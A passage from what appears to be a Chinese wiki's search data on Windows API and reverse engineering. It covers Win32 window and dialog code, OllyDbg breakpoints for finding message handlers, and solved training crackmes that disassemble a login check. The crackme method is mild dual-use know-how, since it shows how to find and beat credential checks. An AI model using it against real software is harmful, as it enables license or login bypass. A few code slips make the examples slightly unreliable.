&lt;stdio.h&gt;LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);void CreateThreeButton(HWND hwnd);HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow) // 控制窗口显示方式的标志&#123; g_hInstance=hInstance; // 1. 定义要创建的窗口是什么样的 WNDCLASS wndClass = &#123;0&#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstance wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 // 2. 创建并显示窗口 RegisterClass(&amp;wndClass); // 注册窗口类 HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPED | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU | WS_THICKFRAME | WS_CAPTION, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空 char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; CreateThreeButton(hWnd); //创建三个按钮 ShowWindow(hWnd, SW_SHOW); // 显示窗口 // 3. 接收消息并处理 MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // 消息循环 &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // 翻译消息 DispatchMessage(&amp;msg); // 分发消息 &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; case(WM_COMMAND): &#123; switch (wParam) &#123; case 0x3E9: &#123; MessageBox(NULL, &quot;Find Me 1&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 1; //修改全局变量的值 return 0; &#125; case 0x3EA: &#123; MessageBox(NULL, &quot;Find Me 2&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 2; //修改全局变量的值 return 0; &#125; case 0x3EB: &#123; MessageBox(NULL, &quot;Find Me 3&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 3; //修改全局变量的值 return 0; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; &#125; case(WM_DESTROY): &#123; PostQuitMessage(0); return 0; &#125; &#125;&#125;void CreateThreeButton(HWND hwnd)&#123; CreateWindowExA( 0, &quot;button&quot;, &quot;Find Me 1&quot;, WS_CHILD|WS_VISIBLE|1, 10,10, 80,20, hwnd, (HMENU)0x3E9, NULL, NULL ); CreateWindowExA( 0, &quot;button&quot;, &quot;Find Me 2&quot;, WS_CHILD|WS_VISIBLE|1, 10,40, 80,20, hwnd, (HMENU)0x3EA, NULL, NULL ); CreateWindowExA( 0, &quot;button&quot;, &quot;Find Me 3&quot;, WS_CHILD|WS_VISIBLE|1, 10,70, 80,20, hwnd, (HMENU)0x3EB, NULL, NULL );&#125;如果验证程序的回调后面多加那句return DefWindowProc(hwnd, uMsg, wParam, lParam);12345678910111213141516171819202122232425262728293031323334353637383940414243LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; case(WM_COMMAND): &#123; switch (wParam) &#123; case 0x3E9: &#123; MessageBox(NULL, &quot;Find Me 1&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 1; //修改全局变量的值 return 0; &#125; case 0x3EA: &#123; MessageBox(NULL, &quot;Find Me 2&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 2; //修改全局变量的值 return 0; &#125; case 0x3EB: &#123; MessageBox(NULL, &quot;Find Me 3&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 3; //修改全局变量的值 return 0; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; &#125; case(WM_DESTROY): &#123; PostQuitMessage(0); return 0; &#125; &#125;+ return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125;编译出Release，拖入OD，确实要有两段DefWindowProc"},{"title":"对话框及回调函数定位","path":"/wiki/Windows_API/对话框及回调函数定位.html","content":"第一个对话框程序 选择项目，右键，添加-资源，可以看到新增了resource.h和MyFirstDialog.rc文件 选择Dialog，点击“新建” 双击rc打开资源文件，选择Diglog，进入到可视化的编辑界面 在这个界面中可以通过可视化的方式新增、删除控件，调整控件布局（选中多个控件后在上方进行等宽，等高，水平对齐等设置），选择控件右键-属性，可以设置该资源相关属性，比如ID号，显示的文字。 使用可视化方式创建资源后，在上面拖拉的控件，VS会为每个新添加的控件分配一个不重复的ID，当保存后，ide会自动帮我们改这个.h文件。 为了代码可读性和维护性，可以修改按钮的ID为一个具有描述性的ID，如IDC_OK，修改取消按钮的ID为IDC_CANCEL。保存后，resource.h会自动对应的宏。 修改ID号前，resource.h的内容修改ID号，保存后，resource.h的内容1234567891011121314151617//&#123;&#123;NO_DEPENDENCIES&#125;&#125;// Microsoft Visual C++ 生成的包含文件。// 供 MyFirstDialog.rc 使用//#define IDD_DIALOG1 101// Next default values for new objects// #ifdef APSTUDIO_INVOKED#ifndef APSTUDIO_READONLY_SYMBOLS#define _APS_NEXT_RESOURCE_VALUE 103#define _APS_NEXT_COMMAND_VALUE 40001#define _APS_NEXT_CONTROL_VALUE 1003#define _APS_NEXT_SYMED_VALUE 101#endif#endif12345678910111213141516171819//&#123;&#123;NO_DEPENDENCIES&#125;&#125;// Microsoft Visual C++ 生成的包含文件。// 供 MyFirstDialog.rc 使用//#define IDD_DIALOG1 101#define IDC_OK 1001#define IDC_CANCEL 1002// Next default values for new objects// #ifdef APSTUDIO_INVOKED#ifndef APSTUDIO_READONLY_SYMBOLS#define _APS_NEXT_RESOURCE_VALUE 103#define _APS_NEXT_COMMAND_VALUE 40001#define _APS_NEXT_CONTROL_VALUE 1003#define _APS_NEXT_SYMED_VALUE 101#endif#endif 显示出对话框 123456INT_PTR DialogBox( HINSTANCE hInstance, // handle to module LPCTSTR lpTemplate, // dialog box template HWND hWndParent, // handle to owner window DLGPROC lpDialogFunc // dialog box procedure ); DialogBox第二个参数，可以传char*或整数值。根据MSDN，如果是整数值，要用MAKEINTRESOURCE宏将资源的ID转换为资源名称，IDD_DIALOG1是资源文件中定义的对话框标识符。 123456789101112131415161718192021222324252627282930#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow // 控制窗口显示方式的标志)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG1), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; return FALSE;&#125; 添加文本框 从工具箱中拖出想到添加的资源，这里我们添加静态文本框（Static Text）和编辑文本框（Edit Control）。静态文本框的ID可以修改，但通常没必要，除非需要在代码中用到它们。其他的资源为了代码可读性也改下ID。 想获得文本框里的子元素，先用GetDlgItem获取对话框中指定控件的句柄。 指明是哪个对话框的哪个资源1234HWND GetDlgItem( [in, optional] HWND hDlg, //对话框的句柄 [in] int nIDDlgItem //资源ID); 12345//1、获取文本框句柄hEditUser = GetDlgItem(hwndDlg, IDC_EDIT_USERNAME);//2、通过句柄得到里面的内容TCHAR szUserBuff[0x50];GetWindowText(hEditUser, szUserBuff, 0x50); 与之前窗口程序的回调函数不同的是，在对话框回调函数中： 处理过的消息，返回TRUE 不处理的消息，返回FALSE 继续完善下回调函数的代码 完整代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow // 控制窗口显示方式的标志)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG1), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; HWND hEditUser = NULL; HWND hEditPassword = NULL; switch (uMsg) &#123; case WM_INITDIALOG: //对话框创建的事件，像之前写窗口程序时的WM_CREATE MessageBox(NULL, TEXT(&quot;WM_INITDIALOG&quot;), TEXT(&quot;INIT&quot;), MB_OK); return TRUE; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case ID_BUTTON_OK: //1、获取文本框句柄 hEditUser = GetDlgItem(hwndDlg, IDC_EDIT_USERNAME); hEditPassword = GetDlgItem(hwndDlg, IDC_EDIT_PASSWORD); //2、通过句柄得到里面的内容 TCHAR szUserBuff[0x50]; //输出缓冲区 TCHAR szPasswordBuffer[0x50]; GetWindowText(hEditUser, szUserBuff, 0x50); GetWindowText(hEditPassword, szPasswordBuffer, 0x50); MessageBox(NULL, TEXT(&quot;OK&quot;), TEXT(&quot;OK&quot;), MB_OK); return TRUE; case ID_BUTTON_EXIT: MessageBox(NULL, TEXT(&quot;EXIT&quot;), TEXT(&quot;EXIT&quot;), MB_OK); EndDialog(hwndDlg, 0); //关闭对话框 return TRUE; &#125; break; &#125; return FALSE;&#125; 运行后，下断，账号那个编辑框输入1，密码那个编辑框输入2，点按钮“确定”后断下，单步，然后看到szUserBuffer被赋值成字符1（ANSI码对应31），szPasswordBuffer被赋值成字符2（ANSI码对应32）。 对话框VS窗口 之前我们讲过创建一个窗口程序的步骤： 定义要创建的窗口是什么样的（为WndClass成员赋值，注册窗口） 创建并显示窗口（CreateWindow） 接收消息并处理（消息循环） 而对话框只需要： 提供消息处理函数 用DiglogBox显示窗口 创建对话框很省事。实际上对话框也是窗口，也需要做上面提的创建窗口的1、2、3步骤，只是省的事由系统帮开发者做了，所以开发者省事了，但实际上要做的事是一样的。 对话框消息处理函数定位 之前窗口程序是通过wndClass.lpfnWndProc找到窗口的回调函数。而对于对话框，程序是使用DiglogBox这个API来显示。这个API是从给外部dll导入的（涉及IAT表知识）。在OD中，OD能识别出这个api，消息处理函数就在参数中，就直接找到了。 上面的示例exe本身的代码逻辑简单，容易找到DiglogBox。而如果面对的是一个对话框非常多，逻辑复杂的程序时，会很难找到你要找的对话框的消息处理函数。此时，可以借助消息断点来帮助我们来找。 让程序跑起来，窗口被创建出来后，点击“W”按钮，刷新，显示出相关的窗口句柄。看到了三个Button，ClsProc对应的就是这个按钮的回调函数，地址是7开头。（不是自己用WndClass自定义的窗口，而是使用系统预先定义好的控件，那这些控件的消息处理函数也是系统提供的，高地址开头）。 选择“Find Me 1”那一条，右键，“在ClsProc上创建消息断点”。在消息下拉框选择消息的类型。消息的类型选择原始的消息类型（未经操作系统处理过的，在Button上什么操作就是什么消息类型）。在我们这个例子中，鼠标松开会弹窗，所以这里选择202 WM_LBUTTONDOWN。 tips：201 WM_LBUTTONDOWN是鼠标按下按钮，202 WM_LBUTTONUP是鼠标按下按钮后松开的操作。 如果不清楚是鼠标按下还是鼠标松开触发了消息，可以在程序上进行测试（OD此时没做任何操作），也就是点点点，试一下。鼠标按下“Find Me 1”按钮按住而不松开，过一会才松开。 如果不松开时，窗口有行为，说明是鼠标按下触发了消息，对应201 如果松开后，窗口有行为，说明是鼠标松开触发了消息，对应202 添加202的消息断点后，看到三个都变色了，因为它们都是Button类，系统为它们提供的系统级消息处理函数都是同一个。 消息断点的本质这时切换到“B”断点视图，对断点，右键，编辑视图，可以得知：消息断点的本质就是条件断点。刚才添加消息断点的操作后，就是由OD自动帮我们在那个系统回调函数地址处加了F2断点+条件断点。 鼠标按下对话框上的“Find Me 1”按钮并松开，OD断下。 点击“M”按钮，进入内存视图，在PE文件的.text代码段上右键，下内存访问断点。如此，有访问到用户空间这段代码时就会断下。 F9跑起来。断在了3环的消息处理函数（原始消息经由系统回调函数处理后，会调用用户编写的消息处理函数。我们刚在PE的代码段下了内存访问断下，所以只要程序一访问3环的代码就会被断下）。 这里有个注意点，通过堆栈我们看到此时发给用户级消息处理函数的消息类型可能不是自己想要的。我们预期是要一个WM_COMMAND，111的消息类型。 F8，F8，单步步回系统的消息处理函数（此时内存访问断点还在，只能F8，会一步一断）。 回到系统的消息处理函数后，F9跑，又会再次断在3环的消息处理函数。观察堆栈的参数，是我们想要的消息类型，WM_COMMAND，111，此时可以将内存访问断点删除，开始分析程序的逻辑了。 消息断点+内存访问断点找3环消息处理函数步骤再梳理 在子窗口的系统回调函数上下消息断点，用户点击子窗口，让OD断在系统消息处理函数 切换到“M”视图，在PE文件的代码段下内存访问断点 F9跑起来，会停在3环的消息处理函数 通过堆栈看到可能不是自己想要的消息类型 那就F8，F8单步步回系统的消息处理函数 F9跑，再次回到3环的消息处理函数，直至是自己想要的消息类型 上面步骤的原理： 子窗口消息的处理逻辑 使用windows预定义好的控件，比如按钮，那么对按钮（子窗口）的操作产生的原始消息是先由系统的回调函数处理，处理后转换为WM_COMMAND消息，再传给父窗口的消息处理函数进行处理。也就是说，用户在3环编写的消息处理函数是经由系统加工后的消息类型。 由上面可知： 用户操作触发的原始消息先由系统的回调函数处理=&gt;上面步骤1在子窗口的系统回调函数上下的消息类型是诸如201 WM_LBUTTONDOWN，202 WM_LBUTTONUP等原始消息，而不是WM_COMMAND消息 在系统的回调函数中会调用3环用户编写的消息处理函数=&gt;在PE代码段下内存访问断点，F9跑起来，等程序回到3环的消息处理函数 为什么回到3环消息处理函数时，可能不是自己想要的WM_COMMAND类型而是其他类型，原因目前笔者想到两个： 简单点地理解是，消息是在不断产生的，消息处理时顺序进行的，在处理我们鼠标松开这个消息前需要处理队列中前面的其他消息。所以系统先处理其他消息，回到3环，3环完了，回到系统回调函数，再F9，这次发给3环的消息处理函数才可能是自己想要的WM_COMMMAND类型 深刻的理解目前能找到的可能的参考资料是《Windows内核情景分析》7.1，7.2节，要看具体的消息处理机制细节。 原始草稿：断在系统消息处理函数后，在代码段下内存访问断点，F9，停在3环的消息处理函数，通过堆栈看到可能不是自己想要的消息类型 F8，F8，单步回系统的消息处理函数（此时内存访问断点还在），F9跑，回到3环的消息处理函数 练习 点击窗口上三个按钮会弹窗，弹窗前程序分别做了什么事（ReverseTraining_3.exe） 过程定位到消息处理函数后，没啥能分析的。就只有Messagebox3E8，3E9，3EA分别是三个按钮的ID号Messagbox后面两行关于eax和esi的操作估计是编译器生成的，而不是程序员写的编译器生成的。看到这个消息处理函数前面push了esi，所以后面retn前pop esi平衡堆栈，然后返回到调用者。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656600401000 &gt; . 8B4424 08 mov eax, dword ptr ss:[esp+8]00401004 . 56 push esi00401005 . 83F8 10 cmp eax, 10 ; Switch (cases 10..201)00401008 . BE 01000000 mov esi, 10040100D . 0F84 A4000000 je 004010B7 ; 004010B700401013 . 3D 11010000 cmp eax, 11100401018 . 74 2A je short 00401044 ; 004010440040101A . 3D 01020000 cmp eax, 2010040101F . 74 06 je short 00401027 ; 0040102700401021 . 33C0 xor eax, eax ; Default case of switch 0040100500401023 . 5E pop esi00401024 . C2 1000 retn 1000401027 &gt; 8B4424 08 mov eax, dword ptr ss:[esp+8] ; Case 201 (WM_LBUTTONDOWN) of switch 004010050040102B . 6A 00 push 0 ; /Style = MB_OK|MB_APPLMODAL0040102D . 68 60604000 push 406060 ; |Title = &quot;Demo&quot;00401032 . 68 54604000 push 406054 ; |Text = &quot;Hello &quot;,B4,&quot;&quot;,B0,&quot;口!&quot;00401037 . 50 push eax ; |hOwner00401038 . FF15 A0504000 call near dword ptr ds:[4050A0] ; \\MessageBoxA0040103E . 8BC6 mov eax, esi00401040 . 5E pop esi00401041 . C2 1000 retn 1000401044 &gt; 8B4424 10 mov eax, dword ptr ss:[esp+10] ; Case 111 (WM_COMMAND) of switch 0040100500401048 . 25 FFFF0000 and eax, 0FFFF0040104D . 2D E8030000 sub eax, 3E8 ; Switch (cases 3E8..3EA)00401052 . 74 46 je short 0040109A ; 0040109A00401054 . 48 dec eax00401055 . 74 26 je short 0040107D ; 0040107D00401057 . 48 dec eax00401058 . 74 06 je short 00401060 ; 004010600040105A . 33C0 xor eax, eax ; Default case of switch 0040104D0040105C . 5E pop esi0040105D . C2 1000 retn 1000401060 &gt; 8B4C24 08 mov ecx, dword ptr ss:[esp+8] ; Case 3EA of switch 0040104D00401064 . 6A 00 push 0 ; /Style = MB_OK|MB_APPLMODAL00401066 . 68 60604000 push 406060 ; |Title = &quot;Demo&quot;0040106B . 68 48604000 push 406048 ; |Text = &quot;Button 3&quot;00401070 . 51 push ecx ; |hOwner00401071 . FF15 A0504000 call near dword ptr ds:[4050A0] ; \\MessageBoxA00401077 . 8BC6 mov eax, esi00401079 . 5E pop esi0040107A . C2 1000 retn 100040107D &gt; 8B5424 08 mov edx, dword ptr ss:[esp+8] ; Case 3E9 of switch 0040104D00401081 . 6A 00 push 0 ; /Style = MB_OK|MB_APPLMODAL00401083 . 68 60604000 push 406060 ; |Title = &quot;Demo&quot;00401088 . 68 3C604000 push 40603C ; |Text = &quot;Button 2&quot;0040108D . 52 push edx ; |hOwner0040108E . FF15 A0504000 call near dword ptr ds:[4050A0] ; \\MessageBoxA00401094 . 8BC6 mov eax, esi00401096 . 5E pop esi00401097 . C2 1000 retn 100040109A &gt; 8B4424 08 mov eax, dword ptr ss:[esp+8] ; Case 3E8 of switch 0040104D0040109E . 6A 00 push 0 ; /Style = MB_OK|MB_APPLMODAL004010A0 . 68 60604000 push 406060 ; |Title = &quot;Demo&quot;004010A5 . 68 30604000 push 406030 ; |Text = &quot;Button 1&quot;004010AA . 50 push eax ; |hOwner004010AB . FF15 A0504000 call near dword ptr ds:[4050A0] ; \\MessageBoxA004010B1 . 8BC6 mov eax, esi004010B3 . 5E pop esi004010B4 . C2 1000 retn 10004010B7 &gt; 8B4C24 08 mov ecx, dword ptr ss:[esp+8] ; Case 10 (WM_CLOSE) of switch 00401005004010BB . 6A 00 push 0 ; /Result = 0004010BD . 51 push ecx ; |hWnd004010BE . FF15 A4504000 call near dword ptr ds:[4050A4] ; \\EndDialog004010C4 . 8BC6 mov eax, esi004010C6 . 5E pop esi004010C7 . C2 1000 retn 10 账户名和密码输入什么才会出现恭喜的弹窗（ReverseTraining_4.exe） 答案根据00401000函数的返回值来弹恭喜或Error的MessageBox返回值为1，恭喜返回值为0，Error这个函数里用了两个缓冲区分别接收编辑框里的内容，随后统计字符个数。只有当账户编辑框输入字符个数为3，密码编辑框输入字符个数为5时，函数返回1。统计缓冲区中字符个数用的是repne scasb汇编指令。《黑皮书汇编语言4th》汇编代码及代码还原示意123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585900401000 /$ 81EC A0000000 sub esp, 0A0 ; 抬栈A0h，160d00401006 |. B9 14000000 mov ecx, 14 ; 14h次，20次0040100B |. 33C0 xor eax, eax ; eax=00040100D |. 53 push ebx ; 保护现场，ret前还原0040100E |. 56 push esi ; 保护现场，ret前还原0040100F |. 8BB424 AC0000&gt;mov esi, dword ptr ss:[esp+AC] ; esi&lt;-hwndDlg00401016 |. 57 push edi ; 保护现场，ret前还原00401017 |. 8D7C24 0C lea edi, dword ptr ss:[esp+C]0040101B |. 68 E8030000 push 3E8 ; /ControlID = 3E8 (1000.)00401020 |. F3:AB rep stos dword ptr es:[edi] ; |00401022 |. B9 14000000 mov ecx, 14 ; |00401027 |. 8D7C24 60 lea edi, dword ptr ss:[esp+60] ; |0040102B |. F3:AB rep stos dword ptr es:[edi] ; |0040102D |. 8B3D A8504000 mov edi, dword ptr ds:[4050A8] ; |USER32.GetDlgItem00401033 |. 56 push esi ; |hWnd00401034 |. FFD7 call near edi ; \\GetDlgItem00401036 |. 68 E9030000 push 3E9 ; /ControlID = 3E9 (1001.)0040103B |. 56 push esi ; |hWnd0040103C |. 8BD8 mov ebx, eax ; |0040103E |. FFD7 call near edi ; \\GetDlgItem00401040 |. 8B3D AC504000 mov edi, dword ptr ds:[4050AC] ; USER32.GetWindowTextA00401046 |. 8BF0 mov esi, eax00401048 |. 8D4424 0C lea eax, dword ptr ss:[esp+C] ; szUserBuffer0040104C |. 6A 50 push 50 ; /Count = 50 (80.)0040104E |. 50 push eax ; |Buffer0040104F |. 53 push ebx ; |hWnd00401050 |. FFD7 call near edi ; \\GetWindowTextA00401052 |. 8D4C24 5C lea ecx, dword ptr ss:[esp+5C] ; szPassBuffer00401056 |. 6A 50 push 50 ; /Count = 50 (80.)00401058 |. 51 push ecx ; |Buffer00401059 |. 56 push esi ; |hWnd0040105A |. FFD7 call near edi ; \\GetWindowTextA0040105C |. 8D7C24 0C lea edi, dword ptr ss:[esp+C] ; szUserBuffer00401060 |. 83C9 FF or ecx, FFFFFFFF00401063 |. 33C0 xor eax, eax00401065 |. F2:AE repne scas byte ptr es:[edi] ; 统计szUserBuffer中有几个字符00401067 |. F7D1 not ecx00401069 |. 49 dec ecx0040106A |. 83F9 03 cmp ecx, 3 ; 个数不是3，退出程序0040106D |. 75 20 jnz short 0040108F ; 0040108F0040106F |. 8D7C24 5C lea edi, dword ptr ss:[esp+5C]00401073 |. 83C9 FF or ecx, FFFFFFFF00401076 |. F2:AE repne scas byte ptr es:[edi] ; 统计szPassBuffer中有几个字符00401078 |. F7D1 not ecx0040107A |. 49 dec ecx0040107B |. 83F9 05 cmp ecx, 5 ; 个数不是5，退出程序0040107E |. 75 0F jnz short 0040108F ; 0040108F00401080 |. 5F pop edi00401081 |. 5E pop esi00401082 |. B8 01000000 mov eax, 100401087 |. 5B pop ebx00401088 |. 81C4 A0000000 add esp, 0A00040108E |. C3 retn0040108F |&gt; 5F pop edi00401090 |. 5E pop esi00401091 |. 33C0 xor eax, eax ; 正确，返回值为000401093 |. 5B pop ebx00401094 |. 81C4 A0000000 add esp, 0A00040109A \\. C3 retn草稿1234567891011121314151617181920212223241个参数：\tedi：721630（hwndDlg）STOS：\tSTOS DWORD PTR ES:[EDI]，将eax的内容保存到EDI寻址的职位\tDF=0，方向：低地址-&gt;高地址，20个DWORD填充为0\t010B173E=GetDlgItem\t00091776=GetDlgItem0019F6BC-0019F70C,szBuffer[50]=0;0019F70C-?,szBuffer2[50]=0;REPNE SCAS BYTE PTR ES:[EDI] // 当ECX!=0并且ZF==0时 重复执行后边的指令 每执行一次ECX的值减1SCASB将AL中的值与EDI寻址的一个字节进行比较REPNE（no equal）repne scas当ecx&gt;0且AL的值不等于内存中每个连续的值，不相等则重复ecx=FFFFFFFF,ecx-1，FFFFFFFC，取反，就是3个账号个数为3，密码为5C语言大致的逻辑示意123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//检查输入的函数int CheckCredentials(HWND hwnd)&#123; char szUserBuffer[0x50] = 0; char szPassBuffer[0x50] = 0; //1、获取文本框句柄 hEditUser = GetDlgItem(hwnd, 0x3E8); //获取账号右边编辑文本框的句柄 hEditPassword = GetDlgItem(hwnd, 0x3E9); //获取密码右边编辑文本框的句柄 //2、获取编辑框里的内容 GetWindowTextA(hEditUser, szUserBuffer, 0x50); GetWindowTextA(hEditPassword, szPassBuffer, 0x50); if (strlen(szUserBuffer) == 3 &amp;&amp; strlen(szPassBuffer) == 5) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; HWND hEditUser = NULL; HWND hEditPassword = NULL; switch (uMsg) &#123; //其他消息类型略 case WM_COMMAND: switch (LOWORD(wParam)) &#123; case 0x3EA: //登录按钮 if (CheckCredentials) &#123; MessageBox(hwndDlg, &quot;恭喜&quot;, &quot;OK&quot;, MB_OK | MB_APPLMODAL); &#125; else &#123; MessageBox(hwndDlg, &quot;ERROR!&quot;, &quot;Error&quot;, MB_OK | MB_APPLMODAL); &#125; return TRUE; &#125; break; &#125; return FALSE;&#125;"},{"title":"创建进程","path":"/wiki/Windows_API/创建进程.html","content":"什么是进程 进程是运行中的一个程序。 课堂上的定义和理解：进程为程序提供所需要的资源，如数据、代码等。进程是一个空间上的概念，它的责任是提供资源，至于资源被怎么使用与它无关。类比：进程提供了一个房间，提供了房间里的东西。至于房间里的东西被怎么使用，房间里的人如何走来走去，那是线程，与进程无关。 例 使用OD打开一个进程，点击’M’按钮，查看该进程的Memory。Memory里就是进程提供的内容。 每个进程都有4GB的虚拟空间，低2G是属于该进程的用户空间，高2G是系统内核用的，高2G的空间是所有进程共用的。 进程也可以理解为由一堆模块组成的，在OD点击’E’按钮，可以查看该进程中所有的模块。每一个模块都是一个PE文件，它们都遵守PE文件结构，每一个PE文件占用一段内存。这些模块为程序提供了资源：代码和数据。 进程内存空间的地址划分 地址（x86 32位windows） 分区 0x00000000-0x0000FFFF 空指针赋值区 0x00010000-0x7FFEFFFF 用户模式区 0x7FFF0000-0x7FFFFFFF 64KB禁入区 0x80000000-0xFFFFFFFF 内核 0x00000000-0x0000FFFF：没挂物理页。用户、系统都不使用的区域 0x7FFF0000-0x7FFFFFFF：没挂物理页。用户、系统都不使用的区域 也就是说，低2G空间的前面64KB和后64KB，都没人使用 进程的创建过程 当双击磁盘上的一个程序时，便创建了一个进程。程序是如何变为进程的，也就是说进程的创建过程是怎样的？ 任何进程都是别的进程创建的。当我们在Windows下双击一个文件，实际上都是由explore.exe这个进程调用CreateProcess函数来创建我们双击文件的进程。系统中第一个进程是由操作系统内核创建的。 CreateProcess的执行过程 将EXE文件映射到低2G的空间中 PE文件中的字段说了在哪加载 在高2G创建该进程的内核对象EPROCESS 每个进程被创建，都要在内核空间创建一个EPROCESS 将系统DLL（ntdll.dll）映射到低2G空间中 在高2G创建该进程的线程内核对象ETHREAD 进程提供了空间上的资源，跑起来要线程。一个进程至少需要一个线程，它才能跑起来 系统启动线程： 映射DLL（ntdll.LdrInitializeThunk） 根据exe输入表中提到运行时需要加载的那些dll（比如有A.dll，B.dll），将这些dll映射到用户空间中。A.dll也有输入表说我需要加载其他的dll，于是也要映射A.dll需要加载的dll。直至这个exe运行所需要的所有dll都映射到用户空间中。 线程开始执行 使用CreateProcess创建进程 注释原版123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // 要启动的程序名（要完整文件路径） LPWSTR lpCommandLine, // 命令行参数 LPSECURITY_ATTRIBUTES lpProcessAttributes, // LPSECURITY_ATTRIBUTES lpThreadAttributes, // BOOL bInheritHandles, // DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // 启动信息 LPPROCESS_INFORMATION lpProcessInformation // OUT参数，传出进程和线程的信息);123456789101112BOOL CreateProcess( LPCTSTR lpApplicationName, // name of executable module LPTSTR lpCommandLine, // command line string LPSECURITY_ATTRIBUTES lpProcessAttributes, // SD LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD BOOL bInheritHandles, // handle inheritance option DWORD dwCreationFlags, // creation flags LPVOID lpEnvironment, // new environment block LPCTSTR lpCurrentDirectory, // current directory name LPSTARTUPINFO lpStartupInfo, // startup information LPPROCESS_INFORMATION lpProcessInformation // process information); STARTUPINFOW structure结构体：Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.程序里一般都已经有了自己窗口如何显示的信息，一般不使用STARTUPINFOW这个结构体，创建这个结构体置0后传进CreateProcess函数。 微软很多结构体中含有一个存储当前结构体大小的成员比如STARTUPINFOW structure结构体，第一个成员是用来记录当前这个结构体的大小，好处：方便以后扩充结构体。通过该成员就可以知道这个结构体的大小1234567891011121314151617181920typedef struct _STARTUPINFOW &#123; DWORD cb; LPWSTR lpReserved; LPWSTR lpDesktop; LPWSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;&#125; STARTUPINFOW, *LPSTARTUPINFOW; PROCESS_INFORMATION结构体 123456typedef struct _PROCESS_INFORMATION 